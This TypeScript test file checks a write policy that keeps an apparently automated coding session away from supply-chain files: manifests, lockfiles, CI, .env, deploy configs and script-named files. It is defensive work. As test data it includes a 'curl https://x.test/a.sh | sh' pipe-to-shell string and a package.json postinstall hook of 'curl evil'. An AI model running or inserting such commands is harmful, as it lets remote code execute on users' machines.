/**
 * The in-place write policy (a session in the owner's checkout, RunContext.inPlace): web source and text
 * kinds are writable anywhere in the git-visible tree, while the supply-chain deny list stays absolute.
 * Every refusal is paired with its legitimate twin, and every in-place widening with the file-mode twin
 * that keeps the 01 policy.
 */
import { execFileSync } from 'node:child_process';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';
import scopeGate from '../../plugins/gates/scope.ts';
import dependencyPolicy from '../../plugins/hooks/dependency-policy.ts';
import { moduleSpecifiers, scriptSource } from '../../plugins/lib/dependencies.ts';
import pathGuard from '../../plugins/hooks/path-guard.ts';
import { INPLACE_WRITABLE_EXTS, inPlaceWritePolicy, scriptFileTokens, writePolicy, writePolicyFor } from '../../plugins/lib/path-policy.ts';
import writeFile from '../../plugins/tools/write_file.ts';
import type { HookVerdict, RunContext, ToolCallInfo } from '../../src/core/plugin-api.ts';
import { brownfieldTask, callInfo, makeHarness, realExec, removeTmp } from './helpers.ts';

const dirs: string[] = [];
afterEach(async () => {
  await Promise.all(dirs.splice(0).map(removeTmp));
});

const task = brownfieldTask({ allow: ['src/**/*.ts', 'test/**/*.ts'], deny: [] });

describe('inPlaceWritePolicy: web source and text kinds anywhere, the supply chain never', () => {
  const writable = [
    'src/App.vue', 'src/routes/+page.svelte', 'src/pages/index.astro', 'src/components/Button.jsx', 'src/components/Button.tsx',
    'src/lib/date.js', 'src/lib/date.mjs', 'scripts/report.cjs', 'src/lib/money.ts', 'src/server/x.mts', 'styles/main.scss', 'src/a.css',
    'src/b.sass', 'src/c.less', 'public/index.html', 'public/logo.svg', 'docs/guide.md', 'docs/guide.mdx', 'src/i18n/en.json',
    'src/openapi/spec.yaml', 'src/data/menu.yml', 'test/a.test.ts', 'src/__tests__/b.spec.jsx', 'packages/web/src/main.ts',
  ];
  for (const f of writable) {
    it(`writable in place: ${f}`, () => expect(inPlaceWritePolicy(task, f)).toMatchObject({ allowed: true }));
  }

  const denied = [
    'package.json', 'packages/web/package.json', 'package-lock.json', 'npm-shrinkwrap.json', 'pnpm-lock.yaml', 'yarn.lock', 'bun.lockb',
    'vite.config.ts', 'packages/web/vite.config.mjs', 'tailwind.config.js', 'src/eslint.config.js', 'postcss.config.cjs', 'jest.config.json',
    'tsconfig.json', 'tsconfig.app.json', 'packages/web/tsconfig.build.json', 'jsconfig.json', 'pnpm-workspace.yaml', 'turbo.json', 'nx.json',
    'angular.json', 'vercel.json', '.env', '.env.local', 'src/.env.test', '.github/workflows/ci.yml', '.gitlab-ci.yml', '.circleci/config.yml',
    '.husky/pre-commit', 'lefthook.yml', 'azure-pipelines.yml', 'bitbucket-pipelines.yml', 'docker-compose.yml', '.npmrc', '.eslintrc.json',
    '.prettierrc', '.vscode/settings.json', 'prisma/schema.prisma', 'prisma/seed.ts', 'db/migrations/001_init.json', 'src/migrations/x.ts',
    'node_modules/pkg/index.js', 'dist/app.js', 'build/static/main.js', 'coverage/lcov.json', 'src/vendor.min.js', 'src/types.d.ts',
    'Package.JSON', 'VITE.CONFIG.TS', '.ENV',
    // git-hook managers
    'simple-git-hooks.json', '.simple-git-hooks.cjs', '.husky/pre-push', 'lefthook.yml', '.lintstagedrc.json', 'lint-staged.config.mjs',
    // deploy configuration
    'firebase.json', 'amplify.yml', 'render.yaml', 'heroku.yml', 'app.json', 'wrangler.toml', 'wrangler.jsonc', 'railway.json', 'serverless.yml',
    'serverless.ts', 'netlify.toml', 'fly.toml', 'Procfile', 'Dockerfile', 'Dockerfile.prod', 'packages/web/Dockerfile', 'k8s/deploy.yaml',
    'helm/values.yaml', '.github/dependabot.yml',
    // task runners and build scripts
    'Taskfile.yml', 'Makefile', 'gulpfile.js', 'Gruntfile.cjs', 'karma.conf.js', 'webpack.prod.js', 'webpack.common.mjs', 'rollup.config.mjs',
    'esbuild.mjs', 'nodemon.json',
    // workspace manifests
    'rush.json', 'package.yaml', 'packages/web/package.yaml', 'lerna.json',
    // root-level scripts outside the source roots (src/ here)
    'server.js', 'index.mjs', 'setup.cjs',
    // data and configuration outside the source roots
    'public/manifest.json', 'openapi/spec.yaml', 'config/settings.yml', 'settings.json',
  ];
  for (const f of denied) {
    it(`denied in place: ${f}`, () => {
      const d = inPlaceWritePolicy(task, f);
      expect(d.allowed).toBe(false);
      expect(d.reason).toMatch(/harness-owned in place \(supply chain/);
    });
  }

  it('other kinds (binaries, shell, Python, Dockerfiles) are refused, naming the kinds that are writable', () => {
    for (const f of ['public/logo.png', 'scripts/deploy.sh', 'tools/x.py', 'src/font.woff2']) {
      const d = inPlaceWritePolicy(task, f);
      expect(d.allowed, f).toBe(false);
      expect(d.reason).toContain('not a web source or text file');
    }
    expect(INPLACE_WRITABLE_EXTS).toContain('.vue');
  });

  it("a task's deny list still narrows the in-place scope; its allow list does not limit it (the scope is the checkout)", () => {
    const narrowed = brownfieldTask({ allow: ['src/**/*.ts'], deny: ['src/legacy/**'] });
    expect(inPlaceWritePolicy(narrowed, 'src/legacy/old.ts')).toMatchObject({ allowed: false });
    expect(inPlaceWritePolicy(narrowed, 'src/styles/app.css')).toMatchObject({ allowed: true });
  });

  it('root-level scripts and data are writable only where a source root covers them; their twins under a source root are writable', () => {
    const src = { sourceRoots: ['src'] };
    expect(inPlaceWritePolicy(task, 'server.js', src)).toMatchObject({ allowed: false, reason: expect.stringMatching(/root-level script outside the source roots \(src\/\)/) });
    expect(inPlaceWritePolicy(task, 'src/server.js', src)).toMatchObject({ allowed: true });
    expect(inPlaceWritePolicy(task, 'public/manifest.json', src)).toMatchObject({ allowed: false, reason: expect.stringMatching(/data or configuration outside the source roots/) });
    expect(inPlaceWritePolicy(task, 'src/i18n/en.json', src)).toMatchObject({ allowed: true });
    // A tsconfig `files` entry names a root-level file exactly: that file is source.
    expect(inPlaceWritePolicy(task, 'server.js', { sourceRoots: ['src', 'server.js'] })).toMatchObject({ allowed: true });
    // '.' (no tsconfig): every directory is source, and so is the app's root-level entry (app.js, server.js,
    // index.js); the repository's root-level tooling and data are not.
    const all = { sourceRoots: ['.'] };
    expect(inPlaceWritePolicy(task, 'lib/charge.js', all)).toMatchObject({ allowed: true });
    expect(inPlaceWritePolicy(task, 'locales/en.json', all)).toMatchObject({ allowed: true });
    for (const f of ['index.js', 'app.js', 'server.js', 'main.mjs']) expect(inPlaceWritePolicy(task, f, all), f).toMatchObject({ allowed: true });
    for (const f of ['wdio.conf.js', 'protractor.conf.cjs', 'gatsby-node.js', 'gatsby-config.mjs', 'brunch-config.js', 'ember-cli-build.js', 'Jakefile.js', 'babel.config.js', 'jest.setup.js']) {
      expect(inPlaceWritePolicy(task, f, all), f).toMatchObject({ allowed: false, reason: expect.stringMatching(/harness-owned in place/) });
    }
    expect(inPlaceWritePolicy(task, 'settings.yml', all)).toMatchObject({ allowed: false });
    // Markup, styles and text are not data: writable anywhere.
    expect(inPlaceWritePolicy(task, 'index.html', src)).toMatchObject({ allowed: true });
    expect(inPlaceWritePolicy(task, 'README.md', src)).toMatchObject({ allowed: true });
  });

  it('tool and deploy names are configs beside a package.json or outside the source roots; source modules that share the name are writable (the twins)', () => {
    const src = { sourceRoots: ['src'], scriptFiles: Object.assign(new Map<string, string>(), { packageDirs: new Set(['', 'packages/web']), incomplete: null }) };
    for (const f of ['rollup.mjs', 'esbuild.js', 'serverless.ts', 'railway.json', 'wrangler.toml', 'app.json', 'firebase.json', 'packages/web/esbuild.mjs', 'packages/web/app.json', 'tools/rollup.js', 'deploy/serverless.yml']) {
      expect(inPlaceWritePolicy(task, f, src), f).toMatchObject({ allowed: false, reason: expect.stringMatching(/harness-owned in place \(supply chain: .* tool or deploy config/) });
    }
    for (const f of ['src/lib/rollup.ts', 'src/railway.ts', 'src/esbuild.ts', 'src/serverless.ts', 'src/i18n/app.json', 'src/config/firebase.json', 'src/workers/wrangler.ts']) {
      expect(inPlaceWritePolicy(task, f, src), f).toMatchObject({ allowed: true });
    }
    // Dockerfiles at any depth, never a component whose name starts with Dockerfile; k8s/ and helm/ manifests, not their source modules.
    for (const f of ['Dockerfile', 'services/api/Dockerfile.dev', 'api.Dockerfile', 'k8s/deploy.yaml', 'src/k8s/pods.yaml', 'helm/values.yml', 'infra/helm/chart/values.json']) {
      expect(inPlaceWritePolicy(task, f, src).allowed, f).toBe(false);
    }
    for (const f of ['src/components/DockerfilePreview.tsx', 'src/k8s/pods.ts', 'src/helm/chart.ts']) expect(inPlaceWritePolicy(task, f, src).allowed, f).toBe(true);
  });

  it('file-mode twin: the 01 policy is unchanged (TypeScript inside the task scope only)', () => {
    for (const f of ['src/App.vue', 'src/lib/date.js', 'src/a.css', 'docs/guide.md', 'src/i18n/en.json']) expect(writePolicy(task, f).allowed, f).toBe(false);
    expect(writePolicy(task, 'src/lib/money.ts').allowed).toBe(true);
    const fileMode = { task, stack: 'express' as const, workspace: { root: join(tmpdir(), 'inplace-policy-no-such-dir') } };
    expect(writePolicyFor(fileMode, 'src/a.css').allowed).toBe(false);
    expect(writePolicyFor({ ...fileMode, inPlace: { repoTop: '/x', branch: 'feat/x' } }, 'src/a.css').allowed).toBe(true);
  });
});

/** A harness over a real git repository (the API root is the repository top), in place unless `fileMode`. */
async function gitHarness(files: Record<string, string>, opts: { fileMode?: boolean } = {}) {
  const h = await makeHarness({ label: 'inplace-policy', task, rootRel: '', files, exec: realExec });
  dirs.push(h.dir);
  const git = (...args: string[]): string => execFileSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@localhost', '-c', 'commit.gpgsign=false', ...args], { cwd: h.dir, encoding: 'utf8' });
  git('init', '-q', '-b', 'feat/x');
  git('add', '-A');
  git('commit', '-q', '-m', 'base');
  const ctx: RunContext = opts.fileMode === true ? h.ctx : { ...h.ctx, inPlace: { repoTop: h.dir, branch: 'feat/x' } };
  return { ...h, ctx, git };
}

const guard = (c: ToolCallInfo, ctx: RunContext): Promise<HookVerdict> => pathGuard.run({ event: 'pre_tool', call: c }, ctx);
const write = (p: string, content = 'x\n'): ToolCallInfo => callInfo(writeFile, { path: p, content });
const reasonOf = (v: HookVerdict): string => (v.decision === 'block' ? v.reason : '');

describe('path-guard in place', () => {
  it('passes a web source file anywhere in the git-visible tree; refuses one git ignores (the twin)', async () => {
    const h = await gitHarness({ '.gitignore': 'generated/\n*.local.ts\n', 'src/main.ts': 'export {};\n' });
    expect(await guard(write('src/App.vue'), h.ctx)).toEqual({ decision: 'pass' });
    expect(await guard(write('styles/new.css'), h.ctx)).toEqual({ decision: 'pass' });
    expect(reasonOf(await guard(write('generated/client.ts'), h.ctx))).toMatch(/path-guard: write refused: generated\/client\.ts is ignored by git/);
    expect(reasonOf(await guard(write('src/secrets.local.ts'), h.ctx))).toMatch(/ignored by git/);
  });

  it('refuses the supply chain whatever the extension, with the deny reason', async () => {
    const h = await gitHarness({ 'src/main.ts': 'export {};\n' });
    for (const f of ['package.json', 'vite.config.ts', '.github/workflows/ci.yml', 'prisma/schema.prisma', 'pnpm-lock.yaml']) {
      expect(reasonOf(await guard(write(f), h.ctx)), f).toMatch(/harness-owned in place/);
    }
  });

  it('file-mode twin: the same web file is refused by the 01 policy, and git is not asked', async () => {
    const h = await gitHarness({ '.gitignore': 'generated/\n', 'src/main.ts': 'export {};\n' }, { fileMode: true });
    expect(reasonOf(await guard(write('src/App.vue'), h.ctx))).toMatch(/is not a \.ts file/);
    // In scope by the task's allow list: file mode leaves ignored writes to the scope gate at finish.
    expect(await guard(write('src/generated.ts'), h.ctx)).toEqual({ decision: 'pass' });
  });
});

describe('every file a package.json script names is denied in place', () => {
  it('scriptFileTokens: file paths, flag values and env values; never globs, directories, URLs or bare words', () => {
    expect(scriptFileTokens('node scripts/build.mjs && vite build')).toEqual(['scripts/build.mjs']);
    expect(scriptFileTokens("cross-env NODE_OPTIONS='--require ./hook.cjs' node server.js")).toEqual(['./hook.cjs', 'server.js']);
    expect(scriptFileTokens('webpack --config=webpack.prod.js; tsc -p tsconfig.build.json')).toEqual(['webpack.prod.js', 'tsconfig.build.json']);
    expect(scriptFileTokens('vitest run src && eslint "src/**/*.ts" && curl https://x.test/a.sh | sh')).toEqual([]);
    expect(scriptFileTokens('npm version 1.2.3 && $EDITOR notes.md')).toEqual(['notes.md']);
  });

  const PKG = JSON.stringify({
    name: 'web',
    scripts: {
      build: 'node scripts/build.mjs && vite build',
      postinstall: 'node ./tools/setup.js',
      dev: 'nodemon --exec "tsx src/server.ts"',
      start: 'node src/main.js',
      test: 'vitest run src',
    },
  });
  const files = {
    'package.json': PKG,
    'packages/api/package.json': JSON.stringify({ name: 'api', scripts: { prepare: 'node ./prep.js', lint: 'node ../../tools/lint.mjs' } }),
    'src/main.js': 'export {};\n',
  };

  it('path-guard refuses each named file (any script, any package.json of the tree), naming where; the unnamed twins pass', async () => {
    const h = await gitHarness(files);
    const named: Array<[string, RegExp]> = [
      ['scripts/build.mjs', /named by package\.json scripts\.build/],
      ['tools/setup.js', /named by package\.json scripts\.postinstall/],
      ['src/server.ts', /named by package\.json scripts\.dev/],
      ['src/main.js', /named by package\.json scripts\.start/],
      ['packages/api/prep.js', /named by packages\/api\/package\.json scripts\.prepare/],
      ['tools/lint.mjs', /named by packages\/api\/package\.json scripts\.lint/],
      ['SRC/Main.JS', /named by package\.json scripts\.start/],
    ];
    for (const [f, why] of named) {
      const reason = reasonOf(await guard(write(f), h.ctx));
      expect(reason, f).toMatch(/harness-owned in place \(supply chain: /);
      expect(reason, f).toMatch(why);
    }
    for (const f of ['src/other.js', 'scripts/other.mjs', 'src/money.test.ts', 'packages/api/src/index.js']) {
      expect(await guard(write(f), h.ctx), f).toEqual({ decision: 'pass' });
    }
  });

  it('the scope gate fails a change to a named file at finish', async () => {
    const h = await gitHarness(files);
    await h.ws.write('src/main.js', 'export const started = true;\n');
    const r = await scopeGate.run(h.ctx, 'finish');
    expect(r.status).toBe('fail');
    expect(r.details?.join('\n')).toMatch(/src\/main\.js: src\/main\.js is harness-owned in place \(supply chain: named by package\.json scripts\.start/);
  });

  it('file-mode twin: the 01 policy is unchanged (a named .ts file inside the task scope stays writable)', async () => {
    const h = await gitHarness(files, { fileMode: true });
    expect(await guard(write('src/server.ts'), h.ctx)).toEqual({ decision: 'pass' });
    expect(writePolicy(task, 'src/server.ts')).toMatchObject({ allowed: true });
  });
});

describe('scope gate in place', () => {
  it('passes changes of web kinds anywhere; fails a change to the supply chain', async () => {
    const h = await gitHarness({ 'src/main.ts': 'export {};\n', 'src/a.css': 'a{}\n', 'package.json': '{"name":"x"}\n' });
    await h.ws.write('src/App.vue', '<template><p/></template>\n');
    await h.ws.write('src/a.css', 'a{color:red}\n');
    expect(await scopeGate.run(h.ctx, 'finish')).toMatchObject({ status: 'pass', summary: '2 changed files, all in scope' });
    await h.ws.write('package.json', '{"name":"x","scripts":{"postinstall":"curl evil"}}\n');
    const r = await scopeGate.run(h.ctx, 'finish');
    expect(r.status).toBe('fail');
    expect(r.details?.join('\n')).toMatch(/package\.json: package\.json is harness-owned in place/);
  });

  it('file-mode twin: the same .vue change is out of scope under the 01 policy', async () => {
    const h = await gitHarness({ 'src/main.ts': 'export {};\n' }, { fileMode: true });
    await h.ws.write('src/App.vue', '<template><p/></template>\n');
    const r = await scopeGate.run(h.ctx, 'finish');
    expect(r.status).toBe('fail');
    expect(r.details?.join('\n')).toMatch(/src\/App\.vue: src\/App\.vue is not a \.ts file/);
  });
});

describe('dependency-policy covers what a session can write: JavaScript and component script blocks', () => {
  const PKG = JSON.stringify({ name: 'web', dependencies: { zod: '4.6.5' } });
  it('refuses a package import added in a .vue <script> block, a .jsx file or an .astro frontmatter; allows an installed declared one', async () => {
    const h = await gitHarness({ 'package.json': PKG });
    const vue = '<template><p>{{ x }}</p></template>\n<script setup lang="ts">\nimport pad from \'left-pad-not-here\';\nconst x = pad;\n</script>\n';
    const jsx = "import pad from 'left-pad-not-here';\nexport const B = () => <p>{pad}</p>;\n";
    const astro = "---\nimport pad from 'left-pad-not-here';\n---\n<p>{pad}</p>\n";
    for (const [file, content] of [['src/App.vue', vue], ['src/B.jsx', jsx], ['src/pages/index.astro', astro]] as const) {
      const v = await dependencyPolicy.run({ event: 'pre_tool', call: write(file, content) }, h.ctx);
      expect(reasonOf(v), file).toMatch(/imports "left-pad-not-here": package left-pad-not-here is not installed/);
    }
    const ok = '<script setup>\nimport { z } from \'zod\';\nexport const s = z.string();\n</script>\n';
    expect(await dependencyPolicy.run({ event: 'pre_tool', call: write('src/Ok.vue', ok) }, h.ctx)).toEqual({ decision: 'pass' });
  });

  it('refuses a package import added in an .mdx ESM block or an .html inline module script; the declared one passes (the twin)', async () => {
    const h = await gitHarness({ 'package.json': PKG, 'node_modules/zod/package.json': '{"name":"zod","version":"4.6.5"}' });
    const mdx = "import Chart from 'chart-not-here';\nimport { z } from 'zod';\n\n# Report\n\n<Chart data={z} />\n";
    const html = '<!doctype html>\n<p>hi</p>\n<script type="module">\nimport confetti from \'confetti-not-here\';\nconfetti();\n</script>\n';
    for (const [file, content, pkg] of [['docs/report.mdx', mdx, 'chart-not-here'], ['public/index.html', html, 'confetti-not-here']] as const) {
      const v = await dependencyPolicy.run({ event: 'pre_tool', call: write(file, content) }, h.ctx);
      expect(reasonOf(v), file).toMatch(new RegExp(`imports "${pkg}": package ${pkg} is not installed`));
    }
    const okMdx = "import { z } from 'zod';\n\n# Report\n";
    const okHtml = '<script type="module">\nimport { z } from \'zod\';\nz.string();\n</script>\n';
    expect(await dependencyPolicy.run({ event: 'pre_tool', call: write('docs/ok.mdx', okMdx) }, h.ctx)).toEqual({ decision: 'pass' });
    expect(await dependencyPolicy.run({ event: 'pre_tool', call: write('public/ok.html', okHtml) }, h.ctx)).toEqual({ decision: 'pass' });
  });

  it('scriptSource: MDX ESM outside code fences, HTML module scripts only (prose, fenced examples and classic scripts are not code)', () => {
    const mdx = "import A from 'a';\nexport const meta = {\n  title: 'x',\n};\n\nSome prose that says import b from 'b'.\n\n```js\nimport c from 'c';\n```\n\nexport { d } from 'd';\n";
    expect(moduleSpecifiers('docs/x.mdx', mdx)).toEqual(['a', 'd']);
    const html = '<script>var x = 1;</script>\n<script type="module" src="./main.js"></script>\n<script type=module>import e from "e";</script>\n<script type="importmap">{"imports":{"f":"/f.js"}}</script>\n';
    expect(moduleSpecifiers('index.html', html)).toEqual(['e']);
    expect(scriptSource('src/a.ts', 'import g from "g";')).toBe('import g from "g";');
  });
});
